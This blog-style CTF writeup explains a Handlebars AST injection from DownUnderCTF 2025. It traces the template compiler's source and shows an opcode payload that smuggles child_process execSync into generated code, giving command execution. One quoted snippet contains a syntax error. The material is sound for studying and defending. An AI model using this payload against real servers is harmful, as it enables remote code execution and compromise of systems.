---
author: Michail Solovev
pubDatetime: 2025-07-30T15:22:00Z
modDatetime: 2025-07-30T16:52:45.934Z
title: DownUnderCTF 2025 AST injection problem
slug: du-theme-mutate
featured: false
draft: false
tags:
  - writeup
description:
  Downunder task writeup.
---


Note: The text below was reviewed by Grok for syntax errors. I haven't double-checked it, so changes may have occurred. Errors or inaccuracies may be present.

For Node.js, as well as regular JavaScript, vulnerabilities like prototype pollution and their derivatives are common.

Dangerous code fragments include:

```
let obj = { a: 1, b: 2 };
"".__proto__.__proto__.c = 3;
for (let i in obj) {
  console.log(i); // a, b, c
}
```

In the loop, all object properties are iterated, including those polluted through the prototype.

## Handlebars with an example of DUCTF task on AST injection

> This article partially complements https://enoch.host/archives/Handlebars-AST-syntax-tree-injection-issue

**Task**

```
FROM alpine:latest AS flag-builder

WORKDIR /build
RUN apk add gcc musl-dev
RUN cat <<EOF > getflag.c
#include <stdio.h>
int main() {
    printf("DUCTF{test_flag}\n");
}
EOF
RUN gcc -static getflag.c -o getflag

FROM node:22-alpine

WORKDIR /app
RUN npm init -y && npm install express@4 handlebars

RUN cat <<EOF > app.js
const express = require("express");
const Handlebars = require("handlebars");
const app = express();

app.get('/', (req, res) => {
    res.send(Handlebars.compile(req.query.x)({}));
});

app.listen(8000, () => console.log('App listening'));
EOF

COPY --from=flag-builder /build/getflag /getflag
RUN chmod 111 /getflag

EXPOSE 8000

USER node
CMD node app.js
```

> In the task, the compiled template is fully controlled, but in real-world usage, typically only the data passed to a pre-compiled template is controlled.
> 
> **Example of traditional usage**

```
var source = "<p>Hello, my name is {{name}}. I am from {{hometown}}. I have " +
 "{{kids.length}} kids:</p>" +
 "<ul>{{#kids}}<li>{{name}} is {{age}}</li>{{/kids}}</ul>";
var template = Handlebars.compile(source);
var data = {
  "name": "Alan",
  "hometown": "Somewhere, TX",
  "kids": [{"name": "Jimmy", "age": "12"}, {"name": "Sally", "age": "4"}]
};
var result = template(data);

// Would render:
// <p>Hello, my name is Alan. I am from Somewhere, TX. I have 2 kids:</p>
// <ul>
// <li>Jimmy is 12</li>
// <li>Sally is 4</li>
// </ul>
```

Let's examine the template compilation mechanism.

```
// file: node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js, line 507
// https://github.com/handlebars-lang/handlebars.js/blob/cc8574e63121861c1c89ef495f9be89ef7dd2413/lib/handlebars/compiler/compiler.js#L458
function compileInput() {
  var ast = env.parse(input, options),
      environment = new env.Compiler().compile(ast, options),
      templateSpec = new env.JavaScriptCompiler().compile(environment, options, undefined, true);
  return env.template(templateSpec);
}
```

Compilation stages:

- **Lexer**: `env.parse(input, options)`
- **Parser**: `env.Compiler().compile(ast, options)`
- **Compiler**: `env.JavaScriptCompiler().compile(environment, options, undefined, true)`
- **Execute**: `env.template(templateSpec)`

In the uncompiled code on GitHub, files are separated by purpose, but in the compiled version in the IDE, the code differs.

## Lexer

```
// node_modules/handlebars/dist/cjs/handlebars/compiler/base.js
// https://github.com/handlebars-lang/handlebars-parser/blob/fbdebfbb531ac60d15754cbf2ad113109b0ab241/lib/parse.js#L13
function parseWithoutProcessing(input, options) {
  if (input.type === 'Program') {
    return input;
  }

  _parser2['default'].yy = yy;
  yy.locInfo = function (locInfo) {
    return new yy.SourceLocation(options && options.srcName, locInfo);
  };

  var ast = _parser2['default'].parse(input);
  return ast;
}
```

If the input is an AST, the Lexer passes it to the Parser. Otherwise, the string is converted into a `Program` type object (AST). Standard used: [Esprima Syntax Tree Format](https://docs.esprima.org/en/latest/syntax-tree-format.html).

## Compiler

```
// https://github.com/handlebars-lang/handlebars.js/blob/cc8574e63121861c1c89ef495f9be89ef7dd2413/lib/handlebars/compiler/compiler.js#L319
NumberLiteral: function (number) {
  this.opcode('pushLiteral', number.value);
},

BooleanLiteral: function (bool) {
  this.opcode('pushLiteral', bool.value);
},

UndefinedLiteral: function () {
  this.opcode('pushLiteral', 'undefined');
},

NullLiteral: function () {
  this.opcode('pushLiteral', 'null');
},
```

Opcode values are passed directly for execution.

## Execute

Compilation in framework terms is the transformation of AST into JavaScript code for execution.

```
// https://github.com/handlebars-lang/handlebars.js/blob/cc8574e63121861c1c89ef495f9be89ef7dd2413/lib/handlebars/compiler/javascript-compiler.js#L64
compile: function (environment, options, context, asObject) {
  this.environment = environment;
  this.options = options;
  this.precompile = !asObject;
  this.name = this.environment.name;
  this.isChild = !!context;
  this.context = context || {
    decorators: [],
    programs: [],
    environments: [],
  };

  this.preamble();
  this.stackSlot = 0;
  this.stackVars = [];
  this.aliases = {};
  this.registers = { list: [] };
  this.hashes = [];
  this.compileStack = [];
  this.inlineStack = [];
  this.blockParams = [];

  this.compileChildren(environment, options);

  this.useDepths = this.useDepths || environment.useDepths || environment.useDecorators || this.options.compat;
  this.useBlockParams = this.useBlockParams || environment.useBlockParams;

  let opcodes = environment.opcodes,
      opcode,
      firstLoc,
      i,
      l;
  for (i = 0, l = opcodes.length; i < l; i++) {
    opcode = opcodes[i];
    this.source.currentLocation = opcode.loc;
    firstLoc = firstLoc || opcode.loc;
    this[opcode.opcode].apply(this, opcode.args);
  }

  let fn = this.createFunctionContext(asObject);

  if (!this.isChild) {
    let ret = {
      compiler: this.compilerInfo(),
      main: fn,
    };
    return ret;
  } else {
    return fn;
  }
}
```

### Example AST Exploit

```
{
  "opcodes": [
    { "opcode": "pushLiteral", "args": ["function () {throw new Error(process.mainModule.require('child_process').execSync('dir').toString())}()"] },
    { "opcode": "pushProgram", "args": [undefined] },
    { "opcode": "pushProgram", "args": [undefined] },
    { "opcode": "emptyHash", "args": [undefined] },
    { "opcode": "getContext", "args": [0] },
    { "opcode": "lookupOnContext", "args": [["undefined"], true, true, false] },
    { "opcode": "invokeHelper", "args": [1, "undefined", true] },
    { "opcode": "append", "args": [] }
  ],
  "options": { "data": true, "isSimple": true, "knownHelpers": { "helperMissing": true } }
}
```

Code:

```
this[opcode.opcode].apply(this, opcode.args);
this["pushLiteral"].apply(this, ["function () {throw new Error(process.mainModule.require('child_process').execSync('dir').toString())}()"]);
```

The `pushLiteral` function is called:

```
pushLiteral: function (value) {
  this.pushStackLiteral(value);
},

pushStackLiteral: function (item) {
  this.push(new Literal(item));
},
```

Malicious code is placed on the stack:

```
push: function (expr) {
  if (!(expr instanceof Literal)) {
    expr = this.source.wrap(expr);
  }
  this.inlineStack.push(expr);
  return expr;
}
```

Stack:

```
inlineStack = [new Literal("function () {throw new Error(process.mainModule.require('child_process').execSync('dir').toString())}()")]
```

Next opcode `pushProgram`:

```
pushProgram: function (guid) {
  if guid != null) {
    this.pushStackLiteral(this.programExpression(guid));
  } else {
    this.pushStackLiteral(null);
  }
},
```

`Literal(null)` is added to the stack:

```
[Literal("function () {throw new Error(...)}()"), Literal(null)]
```

Similarly for the second `pushProgram`:

```
[Literal("function () {throw new Error(...)}()"), Literal(null), Literal(null)]
```

Opcode `emptyHash`:

```
emptyHash: function (omitEmpty) {
  if (this.trackIds) {
    this.push('{}');
  }
  if (this.stringParams) {
    this.push('{}');
    this.push('{}');
  }
  this.pushStackLiteral(omitEmpty ? 'undefined' : '{}');
},
```

Stack:

```
[Literal("function () {throw new Error(...)}()"), Literal(null), Literal(null), Literal({})]
```

Opcode `getContext`:

```
getContext: function (depth) {
  this.lastContext = depth;
}
```

Opcode `lookupOnContext`:

```
lookupOnContext: function (parts, falsy, strict, scoped) {
  var i = 0;
  if (!scoped && this.options.compat && !this.lastContext) {
    this.push(this.depthedLookup(parts[i++]));
  } else {
    this.pushContext();
  }
  this.resolvePath('context', parts, i, falsy, strict);
},

pushContext: function () {
  this.pushStackLiteral(this.contextName(this.lastContext));
},

contextName: function (context) {
  if (this.useDepths && context) {
    return 'depths[' + context + ']';
  } else {
    return 'depth' + context;
  }
},
```

Stack:

```
[Literal("function () {throw new Error(...)}()"), Literal(null), Literal(null), Literal({}), SourceNode {...}]
```

Opcode `invokeHelper`:

```
invokeHelper: function (paramSize, name, isSimple) {
  var nonHelper = this.popStack(),
      helper = this.setupHelper(paramSize, name);
  var possibleFunctionCalls = [];
  if (isSimple) {
    possibleFunctionCalls.push(helper.name);
  }
  possibleFunctionCalls.push(nonHelper);
  if (!this.options.strict) {
    possibleFunctionCalls.push(this.aliasable('container.hooks.helperMissing'));
  }
  var functionLookupCode = ['(', this.itemsSeparatedBy(possibleFunctionCalls, '||'), ')'];
  var functionCall = this.source.functionCall(functionLookupCode, 'call', helper.callParams);
  this.push(functionCall);
},
```

Key moment — `setupParams`:

```
setupParams: function (helper, paramSize, params) {
  let options = {},
      objectArgs = !params,
      param;
  if (objectArgs) {
    params = [];
  }
  options.name = this.quotedString(helper);
  options.hash = this.popStack();
  let inverse = this.popStack(),
      program = this.popStack();
  if (program || inverse) {
    options.fn = program || 'container.noop';
    options.inverse = inverse || 'container.noop';
  }
  let i = paramSize;
  while (i--) {
    param = this.popStack();
    params[i] = param;
  }
  if (objectArgs) {
    options.args = this.source.generateArray(params);
  }
  if (this.options.data) {
    options.data = 'data';
  }
  if (this.useBlockParams) {
    options.blockParams = 'blockParams';
  }
  return options;
},
```

Parameters are extracted from the stack in reverse order (LIFO).

Opcode `append`:

```
append: function () {
  if (this.isInline()) {
    this.replaceStack(function (current) {
      return [' != null ? ', current, ' : ""'];
    });
    this.pushSource(this.appendToBuffer(this.popStack()));
  } else {
    var local = this.popStack();
    this.pushSource(['if (', local, ' != null) { ', this.appendToBuffer(local, undefined, true), ' }']);
    if (this.environment.isSimple) {
      this.pushSource(['else { ', this.appendToBuffer("''", undefined, true), ' }']);
    }
  }
},
```

The `createFunctionContext` function creates the final function:

```
createFunctionContext: function (asObject) {
  let varDeclarations = '';
  let locals = this.stackVars.concat(this.registers.list);
  if (locals.length > 0) {
    varDeclarations += ', ' + locals.join(', ');
  }
  let aliasCount = 0;
  Object.keys(this.aliases).forEach((alias) => {
    let node = this.aliases[alias];
    if (node.children && node.referenceCount > 1) {
      varDeclarations += ', alias' + ++aliasCount + '=' + alias;
      node.children[0] = 'alias' + aliasCount;
    }
  });
  if (this.lookupPropertyFunctionIsUsed) {
    varDeclarations += ', ' + this.lookupPropertyFunctionVarDeclaration();
  }
  let params = ['container', 'depth0', 'helpers', 'partials', 'data'];
  if (this.useBlockParams || this.useDepths) {
    params.push('blockParams');
  }
  if (this.useDepths) {
    params.push('depths');
  }
  let source = this.mergeSource(varDeclarations);
  if (asObject) {
    params.push(source);
    return Function.apply(this, params);
  } else {
    return this.source.wrap([
      'function(',
      params.join(','),
      ') {\n  ',
      source,
      '}',
    ]);
  }
}
```

Function `mergeSource`:

```
mergeSource: function (varDeclarations) {
  let isSimple = this.environment.isSimple,
      appendOnly = !this.forceBuffer,
      appendFirst,
      sourceSeen,
      bufferStart,
      bufferEnd;
  this.source.each((line) => {
    if (line.appendToBuffer) {
      if (bufferStart) {
        line.prepend('  + ');
      } else {
        bufferStart = line;
      }
      bufferEnd = line;
    } else {
      if (bufferStart) {
        if (!sourceSeen) {
          appendFirst = true;
        } else {
          bufferStart.prepend('buffer += ');
        }
        bufferEnd.add(';');
        bufferStart = bufferEnd = undefined;
      }
      sourceSeen = true;
      if (!isSimple) {
        appendOnly = false;
      }
    }
  });
  if (appendOnly) {
    if (bufferStart) {
      bufferStart.prepend('return ');
      bufferEnd.add(';');
    } else if (!sourceSeen) {
      this.source.push('return "";');
    }
  } else {
    varDeclarations += ', buffer = ' + (appendFirst ? '' : this.initializeBuffer());
    if (bufferStart) {
      bufferStart.prepend('return buffer + ');
      bufferEnd.add(';');
    } else {
      this.source.push('return buffer;');
    }
  }
  if (varDeclarations) {
    this.source.prepend('var ' + varDeclarations.substring(2) + (appendFirst ? '' : ';\n'));
  }
  return this.source.merge();
}
```

`helper.callParams` includes the function from `pushLiteral` in the final code:

```
(function anonymous(container,depth0,helpers,partials,data) {
  var stack1, lookupProperty = container.lookupProperty || function(parent, propertyName) {
        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {
          return parent[propertyName];
        }
        return undefined
    };

  return ((stack1 = (lookupProperty(helpers,"undefined")||(depth0 && lookupProperty(depth0,"undefined"))||container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}),function () {throw new Error(process.mainModule.require('child_process').execSync('dir').toString())}(),{"name":"undefined","hash":{},"data":data,"loc":{"start":"0","end":"0"}})) != null ? stack1 : "");
})
```